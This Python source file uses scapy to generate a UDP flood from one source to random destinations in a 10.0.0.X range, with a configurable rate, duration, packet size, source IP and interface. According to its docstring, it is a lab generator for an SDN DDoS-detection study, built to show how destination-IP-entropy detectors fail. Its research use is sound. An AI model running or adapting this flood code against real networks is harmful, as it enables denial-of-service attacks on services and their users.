"""Random-destination single-source flood (the "new-type DDoS" case).

Companion to benign_traffic.py and udp_flood.py:

- benign_traffic.py        many sources, many destinations  -> high entropy (baseline)
- udp_flood.py             one source, one destination      -> dst-IP entropy collapses
- random_dst_flood.py      one source, many destinations    -> dst-IP entropy stays high

Reproduces the "attackrand.py" generator described in chapter 5.2 and case 3
of chapter 6.3 of the companion report (docs/SDN_DDoS_Report.pdf). This is the
case that defeats a dst-IP-entropy-only detector and motivates PCA/ML.
"""

import argparse
import sys
import time
from random import randint

from scapy.all import IP, UDP, Ether, sendp

DEFAULT_RANGE_START = 2
DEFAULT_RANGE_END = 64
DEFAULT_DURATION = 10
DEFAULT_PACKETS_PER_SECOND = 100
DEFAULT_PACKET_SIZE = 1024
DEFAULT_DPORT = 80
DEFAULT_SPORT = 2
DEFAULT_SOURCE_IP = "10.0.0.1"


def random_destination_ip(lower, upper):
    return f"10.0.0.{randint(lower, upper)}"


def launch_random_dst_flood(
    source_ip,
    range_start,
    range_end,
    duration,
    packets_per_second,
    packet_size,
    interface,
):
    payload_len = max(0, packet_size - 42)
    payload = "X" * payload_len
    inter_packet_delay = 1.0 / packets_per_second
    end_time = time.time() + duration

    sent = 0
    while time.time() < end_time:
        dst = random_destination_ip(range_start, range_end)
        pkt = Ether() / IP(src=source_ip, dst=dst) / UDP(sport=DEFAULT_SPORT, dport=DEFAULT_DPORT) / payload
        if interface:
            sendp(pkt, iface=interface, verbose=0)
        else:
            sendp(pkt, verbose=0)
        sent += 1
        time.sleep(inter_packet_delay)
    return sent


def parse_args(argv):
    parser = argparse.ArgumentParser(
        description="Random-destination single-source UDP flood across 10.0.0.[s..e].",
    )
    parser.add_argument(
        "-s", "--start", type=int, default=DEFAULT_RANGE_START,
        help=f"low end of destination range 10.0.0.X (default: {DEFAULT_RANGE_START})",
    )
    parser.add_argument(
        "-e", "--end", type=int, default=DEFAULT_RANGE_END,
        help=f"high end of destination range 10.0.0.X (default: {DEFAULT_RANGE_END})",
    )
    parser.add_argument(
        "--source-ip", default=DEFAULT_SOURCE_IP,
        help=f"source IP address (default: {DEFAULT_SOURCE_IP})",
    )
    parser.add_argument(
        "--duration", type=int, default=DEFAULT_DURATION,
        help=f"flood duration in seconds (default: {DEFAULT_DURATION})",
    )
    parser.add_argument(
        "--rate", type=int, default=DEFAULT_PACKETS_PER_SECOND,
        help=f"packets per second (default: {DEFAULT_PACKETS_PER_SECOND})",
    )
    parser.add_argument(
        "--packet-size", type=int, default=DEFAULT_PACKET_SIZE,
        help=f"packet size in bytes including L2/L3/L4 headers (default: {DEFAULT_PACKET_SIZE})",
    )
    parser.add_argument(
        "--interface", default=None,
        help="network interface to send packets on (default: scapy auto-select)",
    )
    args = parser.parse_args(argv)
    if args.start < 0 or args.end > 255 or args.start > args.end:
        parser.error("--start and --end must satisfy 0 <= start <= end <= 255")
    if args.duration <= 0:
        parser.error("--duration must be > 0")
    if args.rate <= 0:
        parser.error("--rate must be > 0")
    return args


def main(argv=None):
    args = parse_args(argv if argv is not None else sys.argv[1:])
    sent = launch_random_dst_flood(
        source_ip=args.source_ip,
        range_start=args.start,
        range_end=args.end,
        duration=args.duration,
        packets_per_second=args.rate,
        packet_size=args.packet_size,
        interface=args.interface,
    )
    print(f"random_dst_flood: sent {sent} packets from {args.source_ip} to 10.0.0.[{args.start}..{args.end}] over {args.duration}s")


if __name__ == "__main__":
    main()
